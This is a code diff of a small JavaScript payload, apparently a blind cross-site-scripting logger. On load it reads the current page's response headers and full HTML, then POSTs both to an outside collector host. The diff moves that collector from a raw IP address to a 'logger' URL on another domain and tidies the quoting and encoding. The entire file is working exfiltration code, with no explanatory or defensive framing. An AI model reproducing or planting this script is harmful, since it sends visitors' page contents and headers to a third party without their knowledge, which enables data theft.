@@ -1,6 +1,6 @@
 function getHeader() {
 	var req = new XMLHttpRequest();
-	req.open('GET', document.location, false);
+	req.open("GET", document.location, false);
 	req.send(null);
 	var headers = req.getAllResponseHeaders().toLowerCase();
 	//alert(headers);
@@ -17,7 +17,7 @@ function loadXMLDoc(headers) {
         }
     };
 
-    xmlhttp.open("POST", "http://162.243.70.96:8080", true);
-    xmlhttp.send("{'source' : '" +  encodeURI(document.body.parentNode.innerHTML) + "', 'headers' : '" + headers + "'}");
+    xmlhttp.open("POST", "https://dr4cun0.com/logger/", true);
+    xmlhttp.send('{"source" : "' +  encodeURI(document.body.parentNode.innerHTML) + '", "headers" : "' + encodeURI(headers) + '"}');
 }
 getHeader();
